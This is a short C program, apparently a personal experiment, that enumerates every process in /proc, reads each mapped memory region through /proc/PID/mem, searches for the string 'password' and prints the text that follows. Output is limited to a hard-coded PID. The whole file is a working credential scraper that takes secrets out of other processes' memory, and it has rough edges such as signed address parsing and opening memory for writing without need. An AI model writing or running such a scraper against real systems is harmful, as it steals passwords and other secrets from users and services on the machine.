#include <dirent.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>

const char *looking_for = "password: ./a.out";

void *memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen)
{
    int needle_first;
    const void *p = haystack;
    size_t plen = hlen;

    if (!nlen)
        return NULL;

    needle_first = *(unsigned char *)needle;

    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
    {
        if (!memcmp(p, needle, nlen))
            return (void *)p;

        p++;
        plen = hlen - (p - haystack);
    }

    return NULL;
}

int main(int argc, char **argv) {
  pid_t current_pid = getpid();

  printf("**current_pid** %d\n", current_pid);

  struct dirent *dirent;
  DIR *proc_dir = opendir("/proc");

  while ((dirent = readdir(proc_dir)) != NULL) {
    // there is no process 0
    int pid = strtol(dirent->d_name, NULL, 10);
    printf("[pid] %d\n", pid);
    if (pid && pid != current_pid) {
      char maps_path[32];
      char mem_path[32];

      sprintf(maps_path, "/proc/%s/maps", dirent->d_name);
      sprintf(mem_path, "/proc/%s/mem", dirent->d_name);


      FILE *maps = fopen(maps_path, "r");
      if (maps == NULL) {
        perror("[ERROR] couldn't open maps file");
        continue;
      }

      int mem = open(mem_path, O_RDWR);
      if (mem == -1) {
        perror("[ERROR] couldn't open maps file");
        fclose(maps);
        continue;
      }

      size_t line_length = 128;
      int bytes_read = 0;
      char *map_line = NULL;

      while ((bytes_read = getline(&map_line, &line_length, maps)) != -1) {
        char *end_ptr;
        unsigned long int start = strtol(map_line, &end_ptr, 16);
        end_ptr++;
        unsigned long int end = strtol(end_ptr, NULL, 16);

        lseek(mem, start, SEEK_SET);
        unsigned long int size = end - start;

        char *data = malloc(size);
        read(mem, data, size);

        char* search_str = "password";
        char *match = memmem(data, size, search_str, strlen(search_str));

        if (match != NULL && pid == 1203) {
          printf("PID: %d\n", pid);
          for (int i = 0; i < 1000; i++) {
            if (isascii(match[i])) {
              putchar(match[i]);
            } else {
              break;
            }
          }
          putchar('\n');
        }
        free(data);
      };

      free(map_line);
      fclose(maps);
      close(mem);
    }
  }

  closedir(proc_dir);
  return 0;
}
